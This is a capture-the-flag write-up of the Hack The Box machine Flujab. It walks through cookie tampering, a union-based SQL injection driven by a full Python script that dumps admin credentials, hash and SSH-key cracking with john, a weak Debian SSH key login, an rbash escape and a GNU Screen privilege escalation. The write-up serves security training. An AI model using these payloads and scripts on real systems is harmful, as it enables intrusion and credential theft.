---
layout: article
title: Hack the Box - Flujab
permalink: /ctfs/htb-flujab
key: page-aside
aside:
  toc: true
---

Quick write-up of Hack The Box: Flujab

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>


## Enumeration


We start off with an aggressive nmap scan of all ports. 

<img src="/assets/images/ctfs/htb-flujab/nmap.png" alt="" class="center" alt="" class="center">

There are a large number of domains on port 443 and 8080 which we do not have direct IP access to. We add these to our <b>/etc/hosts</b> file for name resolution.

To do so, we'll copy them to a <b>domains.txt</b> file, open the file with vim, and edit the contents with the following <b>sed</b> commands.

```bash
%s/, / /g
%s/DNS\://g
```
We then add these hosts to an entry with the ip 10.10.10.124 in our <b>/etc/hosts</b> file.

```
clownware.htb sni147831.clownware.htb proxy.clownware.htb console.flujab.htb sys.flujab.htb smtp.flujab.htb vaccine4flu.htb bestmedsupply.htb custoomercare.megabank.htb flowerzrus.htb chocolateriver.htb meetspinz.htb rubberlove.htb freeflujab.htb flujab.htb
```

<img src="/assets/images/ctfs/htb-flujab/hosts.png" alt="" class="center" alt="" class="center">

Out of all the domain names, https://freeflujab.htb seems the most promising since https://flujab.htb still returns an error.

<img src="/assets/images/ctfs/htb-flujab/freeflujab.png" alt="" class="center" alt="" class="center">

While doing some recon on the navigable links, we come across these names in the patient testimonials.

```
A. Chun
B. Smith
L. Feggola
J. Walker
```

We notice that some of the Patient links redirect us to a GET /?ERROR=NOT_REGISTERED page. Intercepting with Burp gives us the following parameters.

<img src="/assets/images/ctfs/htb-flujab/not-registered.png" alt="" class="center" alt="" class="center">

We can decode the base64 encoded REGISTERED cookie and see that it decodes to our patient hash=null -- or at least something close to it. 

<img src="/assets/images/ctfs/htb-flujab/decodeb64.png" alt="" class="center" alt="" class="center">

We can try to replace null with True and see if we can avoid the NOT_REGISTERED redirect. Using the developer console in Firefox (F12 > Storage), we can permanently edit our REGISTERED cookie to the proper base64 encoded value, OTYyMTkzYTg4M2UwNWZmNGE1YTYzZDJlZTc1YzdjZmY9VHJ1ZQ%3D%3D.

<img src="/assets/images/ctfs/htb-flujab/encodeb64.png" alt="" class="center" alt="" class="center">

<img src="/assets/images/ctfs/htb-flujab/editedb64.png" alt="" class="center" alt="" class="center">

Using this cookie value, we no longer get redirects from the Patient links. For example, when visiting the Cancel page, we can load /?cancel.

<img src="/assets/images/ctfs/htb-flujab/freeflujab-cancel.png" alt="" class="center" alt="" class="center">

In the developer console, we might also notice a Modus cookie. Putting the cookie value into Burp's decoder shows us that the value is Configure=Null or something similar. Let's encode Configure=True in base64 (Q29uZmlndXJlPVRydWU%3D) and replace this Modus cookie within the Firefox console.

<img src="/assets/images/ctfs/htb-flujab/modus.png" alt="" class="center" alt="" class="center">

Later, when trying to cancel an appointment, we notice we get a redirect to /?smtp_config. 

<img src="/assets/images/ctfs/htb-flujab/smtp_config.png" alt="" class="center" alt="" class="center">

If we try to access the /?smtp_config page directly, we get redirected to /?denied. If we check our Modus cookie in Burp, it looks like it's been reverted to the original "Configure=Null" cookie. Let's replace it again with the base64 encoded version of "Configure=True", "Q29uZmlndXJlPVRydWU%3D", and try once more. Doing so grants us access to the /?smtp_config page.

<img src="/assets/images/ctfs/htb-flujab/smtp_config-granted.png" alt="" class="center" alt="" class="center">

If we inspect the input field on this page, we notice that it requires a certain format of input. 

```html
<input name="mailserver" id="email-server" value="smtp.flujab.htb" pattern="smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}" title=" A Valid SMTP Domain Address Is Required" type="text">
```

Using the developer console, we can eliminate the pattern attribute from the input element.

```html
<input name="mailserver" id="email-server" value="smtp.flujab.htb" title=" A Valid SMTP Domain Address Is Required" type="text">
```

This way, we can enter our IP into the input field and change the patient emailer configuration settings.

<img src="/assets/images/ctfs/htb-flujab/smtp_config-mod.png" alt="" class="center" alt="" class="center">

We might also notice a whitelisted sysadmins page that denies us access when we try to visit the link. If we inspect the response in Burp, we might notice that it sets the Modus cookie to the invalid value where "Configure=Null". We'll have to go into the developer console and change the path of our Modus cookie from "/?smtp_config" to "/". 

<img src="/assets/images/ctfs/htb-flujab/modus-path.png" alt="" class="center" alt="" class="center">

We can then use the Match and Replace option in Burp to match the old value of the cookie and replace that with our desired cookie where "configure=true".

<img src="/assets/images/ctfs/htb-flujab/match-replace.png" alt="" class="center" alt="" class="center">

Now, we should be able to access the whitelisted sysadmins page and see our IP.

<img src="/assets/images/ctfs/htb-flujab/whitelist.png" alt="" class="center" alt="" class="center">

We can then spin up a Python SMTP debugging server with the following one-liner.

```py
root@kali:~/htb/flujab# python -m smtpd -n -c DebuggingServer :25
```

Now, if we attempt to cancel an appointment with a valid pattern such as NHS-111-111-1111, we'll receive a message on our SMTP server. 

```py
root@kali:~/htb/flujab# python -m smtpd -n -c DebuggingServer :25
---------- MESSAGE FOLLOWS ----------
Date: Sun, 23 Jun 2019 02:58:42 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters <DutyNurse@flujab.htb>
Subject: Flu Jab Appointment - Ref:
Message-ID: <7756e6847950d9744b44913516e4e732@freeflujab.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-111-111-1111
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
```

After some varied input, we realize that the input field is vulnerable to SQL injection. We get the following email when "'-- comment" is used as our payload. 

```
---------- MESSAGE FOLLOWS ----------
Date: Sun, 23 Jun 2019 03:03:05 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters <DutyNurse@flujab.htb>
Subject: Flu Jab Appointment - Ref:
Message-ID: <01cab74f99653293d706464af2e2ac58@freeflujab.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : '-- comment
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------

```

Some more experimentation shows that with a payload of “' UNION SELECT 1, 2, 3, 4, 5-- comment”, we'll get the following email. Notice that Ref has a value of 3 which is the third field of our union select query. 

```
---------- MESSAGE FOLLOWS ----------
Date: Sun, 23 Jun 2019 03:14:51 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters <DutyNurse@flujab.htb>
Subject: Flu Jab Appointment - Ref:3
Message-ID: <05f47cb54c49be8aeb12f100646c5869@freeflujab.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1, 2, 3, 4, 5-- comment
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
```

Sending a payload of “' UNION SELECT 1, 2, version(), 4, 5-- comment” gives us the following output in the Ref field. We've now confirmed we have a Union injection that can give us information held in the database.

```
---------- MESSAGE FOLLOWS ----------
Date: Sun, 23 Jun 2019 03:17:57 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters <DutyNurse@flujab.htb>
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
Message-ID: <383382f0449aa61a863fa51d1f146f19@freeflujab.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1, 2, version(), 4, 5-- comment
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
```

The following script is credited to <a href="https://youtu.be/_f9Xygr-qHU" target="_blank">ippsec</a>. Using this script, we can spin up an smtp server and simulate a terminal to send requests to https://flujab.htb without having to go through Burp or the browser. 

```py
root@kali:~/htb/flujab# cat sql-injection.py
from smtpd import SMTPServer
from cmd import Cmd
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import asyncore
import threading
import re

class Terminal(Cmd):
    prompt = "prompt: "

    def inject(self, args):
        payload = f"' {args}-- -"
        data = { 'nhsnum': payload, 'submit':"Cancel Appointment" }
        cookies = { 'Patient': '962193a883e05ff4a5a63d2ee75c7cff', 'Registered': 'OTYyMTkzYTg4M2UwNWZmNGE1YTYzZDJlZTc1YzdjZmY9VHJ1ZQ==', 'Modus': 'Q29uZmlndXJlPVRydWU=' }
        r = requests.post('https://freeflujab.htb/?cancel', data=data, cookies=cookies, verify=False)
        # debugging
        # print(payload)

    def default(self, args):
        self.inject(args)

class EmailServer(SMTPServer):
    def process_message(self, peer, mailfrom, rcptos, data, **kwargs):
        response = str(data, 'utf-8')
        # match anything in the Ref field
        data = re.findall(r'- Ref:(.*)', response)[0]
        print(data)
        print()

def mail():
    EmailServer(('0.0.0.0',25), None)
    asyncore.loop()

threads = []
t = threading.Thread(target=mail)
threads.append(t)
t.start()

# disable SSL error message
requests.packages.urllib3.disable_warnings()
term = Terminal()
term.cmdloop()

```

Taking advantage of the <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema.html" target="_blank">INFORMATION_SCHEMA</a> tables, we can query SCHEMA_NAMES from the SCHEMATA table (see <a href="https://dev.mysql.com/doc/refman/8.0/en/tables-table.html" target="_blank">https://dev.mysql.com/doc/refman/8.0/en/tables-table.html</a>). Once we derive the TABLE_SCHEMAs, we can query the TABLE_NAMEs from each TABLE_SCHEMA. The TABLE_SCHEMAs that give us results are MedStaff, phplist, and vaccinations.

```bash
prompt: union select 1,2,GROUP_CONCAT(SCHEMA_NAME),4,5 from INFORMATION_SCHEMA.SCHEMATA
MedStaff,information_schema,mysql,openmrs,performance_schema,phplist,vaccinations

prompt: union select 1,2,GROUP_CONCAT(TABLE_NAME),4,5 from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='MedStaff'
current_dept_emp,departments,dept_emp,dept_emp_latest_date,dept_manager,employees,salaries,titles

prompt: union select 1,2,GROUP_CONCAT(TABLE_NAME),4,5 from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='phplist'
admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats

prompt: union select 1,2,GROUP_CONCAT(TABLE_NAME),4,5 from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='vaccinations'
admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats
```

From here, we want the columns (see <a href="https://dev.mysql.com/doc/refman/8.0/en/columns-table.html" target="_blank">https://dev.mysql.com/doc/refman/8.0/en/columns-table.html</a>) from interesting TABLE_NAMEs under TABLE_SCHEMAs. Once we get the columns, we can query individual values from each column.

```
prompt: union select 1,2,GROUP_CONCAT(COLUMN_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='vaccinations' and TABLE_NAME='admin'
id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges

prompt: union select 1,2,GROUP_CONCAT(COLUMN_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='vaccinations' and TABLE_NAME='admin'
id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges

prompt: union select 1,2,GROUP_CONCAT(id),4,5 from vaccinations.admin
1

prompt: union select 1,2,GROUP_CONCAT(loginname),4,5 from vaccinations.admin
sysadm

prompt: union select 1,2,GROUP_CONCAT(namelc),4,5 from vaccinations.admin
administrator

prompt: union select 1,2,GROUP_CONCAT(email),4,5 from vaccinations.admin
syadmin@flujab.htb

prompt: union select 1,2,GROUP_CONCAT(access),4,5 from vaccinations.admin
sysadmin-console-01.flujab.htb

prompt: union select 1,2,GROUP_CONCAT(created),4,5 from vaccinations.admin
2018-07-02 08:45:19

prompt: union select 1,2,GROUP_CONCAT(password),4,5 from vaccinations.admin
a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602
```

Judging by the 64 byte output of the password column, we most likely have a SHA-256 encrypted password. The password turns out to be <code>th3doct0r</code>.


## User Shell

```bash
root@kali:~/htb/flujab# echo 'a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602' > pass.txt
root@kali:~/htb/flujab# john --format=raw-sha256 pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
th3doct0r        (?)
1g 0:00:00:00 DONE (2019-06-23 00:14) 3.030g/s 9929Kp/s 9929Kc/s 9929KC/s thetnna..texaszeus1
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

We can add <b>sysadmin-console-01.flujab.htb</b> to <b>/etc/hosts</b>. Access to port 80 is denied, but when we try port 8080, we get a different result.

<img src="/assets/images/ctfs/htb-flujab/sysadmin-console" alt="" class="center" alt="" class="center">

It turns out, the plugin is supposed to load, and we are meant to see a login page for an Ajenti Server Admin Panel. Using <code>sysadm</code> as the username and <code>th3doct0r</code> as the password, we can log into Ajenti.

At this point, since we were unable to get the console plugin to load, I will focus on explaining the remaining vulnerabilities on Flujab without screenshots.

Using the Notepad tool in Ajenti, we have read access to certain files on the server. Attempting to read <b>/proc/self/environ</b> will give an error message, but we find authorized public and private SSH keys for a user named <b>drno</b> in <b>/home/drno/.ssh/</b>. Checking the <b>/etc/hosts.deny</b> file should show hosts that are not allowed to access the system and <b>/etc/hosts.allow</b> should show hosts that are allowed to access the box via SSH. It turns out that sshd is blocked for all hosts.

Adding the following line to the <b>/etc/hosts.allow</b> file finally shows an SSH banner when attempting to connect to 10.10.10.124 via port 22 with SSH.

```
SSHD : 10.10.14.14
ALL : 10.10.14.14
```

No set of credentials we have currently will grant us access, so we copy the private key file located at <b>/home/drno/.ssh/authorized_keys/userkey</b> into a file called <b>private.pem</b> on our local system. We can use <b>ssh2john</b> to turn the private key file into a hash. We can then use <b>john</b> to crack the hash.

```bash
root@kali:~/htb/flujab# ssh2john.py private.pem > drno.ssh
root@kali:~/htb/flujab# john drno.ssh --wordlist=/usr/share/wordlists/rockyou.txt
```

The password we get for the SSH private key is <b>shadowtroll</b>. Unforunately, the server still denies us access when we try to the passphrase with our private key file.

```bash
root@kali:~/htb/flujab# chmod 600 private.pem
root@kali:~/htb/flujab# ssh -i private.pem drno@10.10.10.124
```

Using the following command, we see that the public key generated from our current private key does not match the authorized keys file in <b>/home/drno/.ssh/authorized_keys</b>. It therefore makes sense that our private key file is being denied.

```bash
root@kali:~/htb/flujab# ssh-keygen -y -f private.pem
```

Looking inside the <b>/etc/ssh/</b> folder, we find the <b>sshd_config</b> file. Within this file, we see that there is an authorized keys file in <b>.ssh/authorized_keys_access</b>. We also find a deprecated keys directory at <b>/etc/ssh/deprecated_keys</b>. The last piece to the puzzle is <b>/etc/issue</b> which reveals that the machine is running Debian. Putting all of this together, we conclude that the vulnerability lies in weak SSH keys which we can read more about at <a href="https://github.com/g0tmi1k/debian-ssh" target="_blank">https://github.com/g0tmi1k/debian-ssh</a>.

Looking into public keys found in /etc/ssh/deprecated_keys, we find one named <b>0223269.pub</b>. If we clone the github repository above on our local system, we'll find that one of the key pair fingerprints in <b>debian-ssh/uncommon_keys/debian_ssh_rsa_4096_x86.tar.bz2</b> matches the fingerprint of the deprecated public key. We copy the corresponding compromised private key into a new file called <b>compromised.pem</b> and use the following command to connect to 10.10.10.124. We may have to add our IP to the <b>hosts.allow</b> file again.

```bash
root@kali:~/htb/flujab# ssh -i compromised.pem drno@flujab.htb
```


## Root Shell

We find ourselves in a restricted shell (rbash). If we look at the commands available to use by using Tab, we find that we have the ability to execute <b>make</b>. We can break out of the restricted shell by using the shell breakout method found at <a href="https://gtfobins.github.io/gtfobins/make/" target="_blank">https://gtfobins.github.io/gtfobins/make/</a>. Alternatively, we can also use the following command to spawn a bash shell immediately upon SSH connection.

```bash
root@kali:~/htb/flujab# ssh drno@10.10.10.124 -i compromised.pem -t bash
```

To set our PATH variable, we can copy the PATH variable on our local machine which can be seen using <code>echo $PATH</code> and paste the contents to the PATH variable on flujab.

```bash
drno@flujab:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/sbin:/bin...
```

If we look at setuid binaries, we find an interesting binary at <b>/usr/local/share/screen/screen</b>. It turns out this is not the same binary located at <b>/usr/bin/screen</b>.

```bash
drno@flujab:~$ find / -perm 4755 2>/dev/null
```

Searchsploit will return a local prviilege escalation vulnerability in GNU Screen 4.5.0, which is the version of <b>/usr/local/share/screen/screen</b>. We'll have to compile the exploit manually on our local box since <b>gcc</b> is not available on flujab. We can copy the files to the vulnerable machine using <b>wget</b> and execute the commands as specified by the exploit script. Once doing so, we'll have successfully obtained a root shell.

